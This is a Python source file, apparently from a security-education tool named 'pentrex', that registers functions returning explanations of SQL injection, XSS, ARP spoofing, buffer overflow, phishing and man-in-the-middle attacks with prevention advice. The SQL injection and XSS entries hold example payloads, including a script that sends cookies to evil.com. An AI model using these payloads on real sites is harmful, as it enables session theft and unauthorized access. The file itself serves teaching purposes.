"""Security concept explanations."""

from pentrex.tools.registry import register

CONCEPTS = {
    "sql_injection": {
        "name": "SQL Injection",
        "category": "Web Security",
        "description": "A code injection technique that exploits vulnerabilities in database queries.",
        "how_it_works": [
            "Application takes user input and builds SQL query",
            "Input isn't sanitized or parameterized",
            "Attacker injects SQL code that alters the query",
            "Database executes malicious query"
        ],
        "example": {
            "vulnerable_code": "SELECT * FROM users WHERE name = '" + "user_input" + "'",
            "payload": "' OR '1'='1",
            "result": "Query returns all users, bypassing authentication"
        },
        "prevention": [
            "Use parameterized queries / prepared statements",
            "Input validation and sanitization",
            "Least privilege database accounts",
            "Web Application Firewall (WAF)"
        ],
        "tools": ["sqlmap", "Havij", "Burp Suite"],
    },
    "xss": {
        "name": "Cross-Site Scripting (XSS)",
        "category": "Web Security",
        "description": "Injection of malicious scripts into web pages viewed by other users.",
        "types": {
            "stored": "Script permanently stored on target server (database, comments)",
            "reflected": "Script reflected off web server (error messages, search results)",
            "dom_based": "Script executes due to DOM modifications in browser"
        },
        "how_it_works": [
            "Attacker finds input that's reflected in page output",
            "Injects JavaScript payload",
            "Victim visits the page",
            "Script executes in victim's browser context"
        ],
        "example": {
            "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "result": "Steals session cookie"
        },
        "prevention": [
            "Output encoding (HTML entities)",
            "Content Security Policy (CSP)",
            "HTTPOnly cookie flag",
            "Input validation"
        ],
        "tools": ["XSSer", "Burp Suite", "OWASP ZAP"],
    },
    "arp_spoofing": {
        "name": "ARP Spoofing",
        "category": "Network Security",
        "description": "Sending fake ARP messages to link attacker's MAC with a legitimate IP.",
        "how_it_works": [
            "Attacker sends gratuitous ARP replies",
            "Victim's ARP cache gets poisoned",
            "Traffic meant for gateway goes to attacker",
            "Attacker can sniff, modify, or block traffic"
        ],
        "requirements": [
            "Attacker must be on same network segment",
            "No ARP security measures in place"
        ],
        "use_cases": [
            "Man-in-the-Middle attacks",
            "Session hijacking",
            "DNS spoofing",
            "Denial of Service"
        ],
        "prevention": [
            "Static ARP entries for critical hosts",
            "Dynamic ARP Inspection (DAI)",
            "VPN for sensitive communications",
            "Port security on switches"
        ],
        "tools": ["arpspoof", "Ettercap", "Bettercap"],
    },
    "buffer_overflow": {
        "name": "Buffer Overflow",
        "category": "System Security",
        "description": "Writing data beyond allocated memory buffer, potentially overwriting execution flow.",
        "types": {
            "stack": "Overwrites return address on stack",
            "heap": "Corrupts heap metadata or function pointers",
            "integer": "Arithmetic errors leading to small buffer allocation"
        },
        "how_it_works": [
            "Program allocates fixed-size buffer",
            "Input exceeds buffer size without bounds checking",
            "Adjacent memory (return address) gets overwritten",
            "Execution redirected to attacker's shellcode"
        ],
        "prevention": [
            "ASLR (Address Space Layout Randomization)",
            "DEP/NX (Data Execution Prevention)",
            "Stack canaries",
            "Safe functions (strncpy vs strcpy)",
            "Compiler protections (-fstack-protector)"
        ],
        "tools": ["GDB", "Immunity Debugger", "Mona.py", "ROPgadget"],
    },
    "phishing": {
        "name": "Phishing",
        "category": "Social Engineering",
        "description": "Fraudulent attempts to obtain sensitive information by impersonating trusted entities.",
        "types": {
            "email": "Mass emails impersonating legitimate services",
            "spear": "Targeted attacks on specific individuals",
            "whaling": "Targeting high-profile executives",
            "vishing": "Voice-based phishing calls",
            "smishing": "SMS-based phishing"
        },
        "indicators": [
            "Urgent or threatening language",
            "Mismatched or suspicious URLs",
            "Poor grammar and spelling",
            "Requests for sensitive information",
            "Unexpected attachments"
        ],
        "prevention": [
            "Security awareness training",
            "Email filtering and SPF/DKIM/DMARC",
            "Multi-factor authentication",
            "URL reputation checking",
            "Reporting mechanisms"
        ],
        "tools": ["Gophish", "King Phisher", "SET (Social Engineering Toolkit)"],
    },
    "mitm": {
        "name": "Man-in-the-Middle Attack",
        "category": "Network Security",
        "description": "Attacker secretly intercepts and potentially alters communication between two parties.",
        "techniques": [
            "ARP Spoofing",
            "DNS Spoofing",
            "SSL Stripping",
            "Rogue Access Points",
            "BGP Hijacking"
        ],
        "how_it_works": [
            "Attacker positions between victim and destination",
            "Intercepts all traffic in both directions",
            "Can read, modify, or inject data",
            "Parties unaware of interception"
        ],
        "prevention": [
            "End-to-end encryption (TLS/SSL)",
            "Certificate pinning",
            "VPN usage",
            "HSTS (HTTP Strict Transport Security)",
            "Network monitoring"
        ],
        "tools": ["Ettercap", "Bettercap", "mitmproxy", "Wireshark"],
    },
}


@register(
    name="explain_concept",
    description="Get detailed explanation of a security concept.",
    parameters={
        "concept": {
            "type": "string",
            "description": "Concept to explain: sql_injection, xss, arp_spoofing, buffer_overflow, phishing, mitm"
        }
    }
)
def explain_concept(concept: str) -> dict:
    key = concept.lower().replace(" ", "_").replace("-", "_")
    
    if key not in CONCEPTS:
        return {
            "error": f"Concept not found: {concept}",
            "available": list(CONCEPTS.keys())
        }
    
    return CONCEPTS[key]


@register(
    name="list_concepts",
    description="List all available security concepts.",
    parameters={},
    required=[]
)
def list_concepts() -> dict:
    return {
        "concepts": [
            {"key": k, "name": v["name"], "category": v["category"]}
            for k, v in CONCEPTS.items()
        ]
    }
